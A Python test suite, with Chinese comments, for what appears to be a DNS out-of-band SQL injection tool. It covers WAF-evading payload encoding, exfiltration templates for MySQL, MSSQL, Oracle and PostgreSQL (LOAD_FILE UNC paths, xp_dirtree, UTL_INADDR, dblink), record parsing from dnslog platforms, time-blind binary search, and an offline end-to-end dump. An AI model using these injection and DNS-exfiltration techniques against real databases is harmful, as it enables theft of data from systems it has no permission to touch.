"""DnslogSqlinj 3 测试套件 —— 全离线, 不访问网络。

覆盖: 编码策略 / 四种 DBMS 模板 / 记录解析 / 平台异常重试 / 时间盲注二分 / 端到端。
"""
import http.server
import io
import json
import re
import socketserver
import threading
import unittest
import urllib.error
import urllib.parse
from unittest import mock

import dnslogsqlinj3 as dsi
from dnslogsqlinj3 import DBMS_MAP, encode_payload

class TestEncoding(unittest.TestCase):
    def test_waf_safe_keeps_brackets_quotes_slash(self):
        sql = "(SELECT LOAD_FILE(CONCAT('//','a.b','/x.txt')))"
        self.assertEqual(encode_payload(sql), sql.replace(" ", "%20"))

    def test_space_and_separators_are_encoded(self):
        out = encode_payload("a b&c#d%e+f")
        self.assertNotIn(" ", out)
        for ch in ("&", "#", "+"):          # 这些出现在查询串里会改变语义
            self.assertNotIn(ch, out)
        self.assertIn("%20", out)
        self.assertIn("%25", out)           # % 必须编码成 %25

    def test_strict_mode_matches_quote_default(self):
        sql = "(SELECT 1)" 
        self.assertEqual(encode_payload(sql, "strict"), "%28SELECT%201%29")

    def test_single_quote_survives_auto_mode(self):
        self.assertEqual(encode_payload("1' AND 1=1-- -").count("%27"), 0)

class TestDBMSTemplates(unittest.TestCase):
    def setUp(self):
        self.domain = "abcd1234.ceye.io"

    def _db(self, name):
        db = DBMS_MAP[name]()
        db.domain = self.domain
        return db

    def test_mysql_uses_forward_slash_unc(self):
        sql = self._db("mysql").hex_sql("n1.h000000", "(select version())", 0, 30)
        self.assertIn("LOAD_FILE", sql)
        self.assertIn("'//'", sql)
        self.assertNotIn("0x5c5c", sql)          # 反斜杠 UNC 在该环境不触发解析
        self.assertIn(self.domain, sql)
        self.assertNotIn("%LABEL%", sql)

    def test_mssql_xp_dirtree(self):
        sql = self._db("mssql").hex_sql("n1.h000000", "(select db_name())", 0, 30)
        self.assertIn("xp_dirtree", sql)
        self.assertIn(self.domain, sql)

    def test_oracle_utl_inaddr(self):
        sql = self._db("oracle").hex_sql("n1.h000000", "(select user from dual)", 0, 30)
        self.assertIn("UTL_INADDR", sql)

    def test_postgres_dblink(self):
        sql = self._db("postgres").hex_sql("n1.h000000", "(select version())", 0, 30)
        self.assertIn("dblink", sql)

    def test_every_dbms_has_blind_and_time_templates(self):
        for name in DBMS_MAP:
            db = self._db(name)
            self.assertTrue(db.hex_sql("m", "(1)", 0, 10))
            self.assertIn("m", db.blind_sql("m", "1=1"))
            self.assertIn("m", db.blind_sql("m", "1=1"))
            self.assertTrue(db.time_tpl, name)

    def test_mysql_time_template(self):
        db = self._db("mysql")
        sql = db.time_tpl.format(cond="1=1", delay=1.0)
        self.assertIn("SLEEP(1.0)", sql)

class TestDnslogCN(unittest.TestCase):
    def test_parses_nested_list_records(self):
        prov = dsi.DnslogCN()
        payload = json.dumps([["aa.x.dnslog.cn", "1.2.3.4", "2026-10-27 17:00:00"],
                              ["bb.y.dnslog.cn", "1.2.3.4", "2026-10-27 17:00:01"]])
        with mock.patch.object(prov, "_get", return_value=payload):
            self.assertEqual(prov.get_records(), ["aa.x.dnslog.cn", "bb.y.dnslog.cn"])

    def test_tolerates_empty_and_garbage(self):
        prov = dsi.DnslogCN()
        with mock.patch.object(prov, "_get", return_value="[]"):
            self.assertEqual(prov.get_records(), [])
        with mock.patch.object(prov, "_get", return_value="<html>busy</html>"):
            self.assertEqual(prov.get_records(), [])


class TestCeye(unittest.TestCase):
    def test_domain_uses_ident(self):
        self.assertEqual(dsi.Ceye("tok", "w3vx3x").get_domain(), "w3vx3x.ceye.io")

    def test_query_carries_filter(self):
        prov = dsi.Ceye("tok", "w3vx3x", filter_="abcd")
        seen = {}

        class Resp(io.BytesIO):
            def __enter__(self):
                return self

            def __exit__(self, *a):
                return False

        def fake_urlopen(req, timeout=None):
            seen["url"] = req.full_url
            return Resp(json.dumps({"meta": {"code": 200},
                                    "data": [{"name": "abcd.h000000.41.w3vx3x.ceye.io"}]}).encode())

        with mock.patch.object(dsi.urllib.request, "urlopen", fake_urlopen):
            self.assertEqual(prov.get_records(), ["abcd.h000000.41.w3vx3x.ceye.io"])
        self.assertIn("filter=abcd", seen["url"])
        self.assertIn("type=dns", seen["url"])

    def test_invalid_token_error_is_translated(self):
        prov = dsi.Ceye("bad", "w3vx3x")
        body = json.dumps({"meta": {"code": 21, "message": "User Not Exists"}}).encode()

        def fake_urlopen(req, timeout=None):
            raise urllib.error.HTTPError(req.full_url, 404, "Not Found", {}, io.BytesIO(body))

        with mock.patch.object(dsi.urllib.request, "urlopen", fake_urlopen):
            with self.assertRaises(RuntimeError) as ctx:
                prov.get_records()
        self.assertIn("token 无效", str(ctx.exception))


class TestCmdProvider(unittest.TestCase):
    def test_reads_domain_and_records_from_commands(self):
        prov = dsi.CmdProvider("echo dom.ceye.io", "echo a.dom.ceye.io")
        self.assertEqual(prov.get_domain(), "dom.ceye.io")
        self.assertEqual(prov.get_records(), ["a.dom.ceye.io"])

    def test_parses_json_records(self):
        prov = dsi.CmdProvider("echo dom.ceye.io",
                               """echo '[{"name": "b.dom.ceye.io"}]'""")
        prov.get_domain()
        self.assertEqual(prov.get_records(), ["b.dom.ceye.io"])

class FakeProvider(dsi.Provider):
    def __init__(self, domain, records=None, fail_times=0):
        self._domain = domain
        self.records = list(records or [])
        self.fail_times = fail_times
        self.calls = 0

    def get_domain(self):
        return self._domain

    def get_records(self):
        self.calls += 1
        if self.calls <= self.fail_times:
            raise RuntimeError("platform 502")
        return self.records


class TestParsing(unittest.TestCase):
    def test_hex_chunk_reads_record_between_marker_and_domain(self):
        db = dsi.MySQL()
        db.domain = "dom.ceye.io"
        prov = FakeProvider("dom.ceye.io", ["n1.h000000.414243.dom.ceye.io"])
        ex = dsi.DnsExfil(prov, db, "http://127.0.0.1:1/?id=%PAYLOAD%",
                          nonce="n1", poll=0.01, timeout=1, http_timeout=1)
        ex.domain = "dom.ceye.io"
        with mock.patch.object(ex, "fire", return_value=0.01):
            self.assertEqual(ex.hex_chunk("(select 1)", 0, 30), b"ABC")

    def test_wait_for_survives_platform_hiccup(self):
        prov = FakeProvider("dom.ceye.io", ["n1.h000000.41.dom.ceye.io"], fail_times=2)
        ex = dsi.DnsExfil(prov, dsi.MySQL(), "http://x/?id=%PAYLOAD%",
                          nonce="n1", poll=0.01, timeout=2, http_timeout=1)
        ex.domain = "dom.ceye.io"
        self.assertEqual(ex.wait_for("n1.h000000"), "n1.h000000.41.dom.ceye.io")


class TestTimeBlind(unittest.TestCase):
    """时间盲注的二分逻辑: 用假时钟验证判定与取值。"""

    def _ex(self, secret):
        db = dsi.MySQL()
        db.domain = "dom.ceye.io"
        ex = dsi.DnsExfil(FakeProvider("dom.ceye.io"), db, "http://x/?id=%PAYLOAD%",
                          nonce="n1", poll=0.01, timeout=1, http_timeout=1,
                          sleep_delay=1.0, samples=2)
        ex.domain = "dom.ceye.io"

        def fake_fire(sql, label):
            # 从 SQL 里解出 pos 和 mid, 判真则返回"睡了"
            import re
            m = re.search(r"ASCII\(SUBSTR\(\(\(.*\)\),(\d+),1\)\)>(\d+)", sql)
            if not m:
                return 0.0
            pos, mid = int(m.group(1)), int(m.group(2))
            hit = secret[pos - 1] > mid
            return 1.05 if hit else 0.02

        ex.fire = fake_fire
        return ex

    def test_binary_search_reads_secret(self):
        secret = b"security"
        ex = self._ex(secret)
        got = b"".join(bytes([ex.time_char("(select database())", p)])
                       for p in range(1, len(secret) + 1))
        self.assertEqual(got, secret)

    def test_time_dump_stops_on_nul(self):
        ex = self._ex(b"ab\x00cd")
        self.assertEqual(ex.time_dump("(select x)", max_len=8), b"ab")


class TestDump(unittest.TestCase):
    def test_multi_chunk_assembly(self):
        db = dsi.MySQL()
        db.domain = "dom.ceye.io"
        value = b"a" * 70
        prov = FakeProvider("dom.ceye.io")
        ex = dsi.DnsExfil(prov, db, "http://x/?id=%PAYLOAD%",
                          nonce="n1", poll=0.01, timeout=1, http_timeout=1)
        ex.domain = "dom.ceye.io"

        def fake_fire(sql, label):
            import re
            m = re.search(r"h(\d{6})", label)
            off = int(m.group(1))
            chunk = value[off:off + 30]
            prov.records = ["n1.h%06d.%s.dom.ceye.io" % (off, chunk.hex())] if chunk else []
            return 0.01

        ex.fire = fake_fire
        self.assertEqual(ex.dump("(select x)", chunk=30, max_bytes=200), value)

VALUE = b"5.7.26 | security | root@localhost"
DOMAIN = "abcd1234.example.test"


class _Registry:
    records = []


class _Handler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        path = urllib.parse.unquote(self.path)
        m = re.search(r"([a-z0-9]{2,8})\.h(\d{6})\.", path)
        if m:
            marker, off = "%s.h%s" % (m.group(1), m.group(2)), int(m.group(2))
            chunk = VALUE[off:off + 8]          # 模拟 SQL 侧 SUBSTR(...,8)
            if chunk:
                _Registry.records.append("%s.%s.%s" % (marker, chunk.hex(), DOMAIN))
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"ok")

    def log_message(self, *a):
        pass


class MemProvider(dsi.Provider):
    def get_domain(self):
        return DOMAIN

    def get_records(self):
        return list(_Registry.records)


class TestEndToEnd(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        socketserver.TCPServer.allow_reuse_address = True
        cls.srv = socketserver.TCPServer(("127.0.0.1", 0), _Handler)
        cls.port = cls.srv.server_address[1]
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()

    def setUp(self):
        _Registry.records = []

    def test_dump_round_trip(self):
        db = dsi.MySQL()
        db.domain = DOMAIN
        ex = dsi.DnsExfil(MemProvider(), db,
                          "http://127.0.0.1:%d/?id=1'%%PAYLOAD%%--+-" % self.port,
                          nonce="n1", poll=0.02, timeout=3, http_timeout=2)
        ex.domain = DOMAIN
        data = ex.dump("(select concat(version(),' | ',database()))", chunk=8, max_bytes=64)
        self.assertEqual(data, VALUE)

    def test_payload_uses_forward_slash_and_keeps_parens(self):
        db = dsi.MySQL()
        db.domain = DOMAIN
        ex = dsi.DnsExfil(MemProvider(), db,
                          "http://127.0.0.1:%d/?id=1'%%PAYLOAD%%--+-" % self.port,
                          nonce="n1", poll=0.02, timeout=2, http_timeout=2)
        ex.domain = DOMAIN
        seen = {}
        ex.fire = lambda sql, label: seen.setdefault("sql", sql) or 0.01
        ex.hex_chunk("(select 1)", 0, 8)
        self.assertIn("'//'", seen["sql"])
        self.assertNotIn("%28", dsi.encode_payload(seen["sql"]))

if __name__ == "__main__":
    unittest.main()
